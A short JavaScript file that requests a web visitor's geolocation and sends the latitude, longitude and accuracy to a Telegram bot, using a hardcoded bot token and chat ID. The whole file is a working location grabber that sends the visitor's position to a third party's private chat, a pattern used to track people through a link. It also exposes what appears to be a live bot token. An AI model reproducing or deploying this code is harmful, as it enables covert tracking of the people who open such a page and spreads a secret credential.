const TELEGRAM_BOT_TOKEN = '7467479115:AAEbsRubACeGgu3OWQ94uW1ScCrz2WaWPRE'; 
const TELEGRAM_CHAT_ID = '6581772299'; // Replace with your actual chat ID

const statusElement = document.getElementById('status');

if ("geolocation" in navigator) {
  statusElement.textContent = "Requesting location...";

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      statusElement.textContent = "Location obtained. Sending to Telegram...";

      const message = `Location Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`;
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      fetch(telegramUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      })
        .then((response) => {
          if (response.ok) {
            statusElement.textContent = "Location sent to Telegram successfully.";
          } else {
            statusElement.textContent = "Failed to send location to Telegram.";
          }
        })
        .catch((error) => {
          statusElement.textContent = "Error sending location to Telegram.";
          console.error("Error:", error);
        });
    },
    (error) => {
      switch (error.code) {
        case error.PERMISSION_DENIED:
          statusElement.textContent = "Permission denied.";
          break;
        case error.POSITION_UNAVAILABLE:
          statusElement.textContent = "Position unavailable.";
          break;
        case error.TIMEOUT:
          statusElement.textContent = "Request timed out.";
          break;
        default:
          statusElement.textContent = "An unknown error occurred.";
          break;
      }
    }
  );
} else {
  statusElement.textContent = "Geolocation is not supported by this browser.";
}
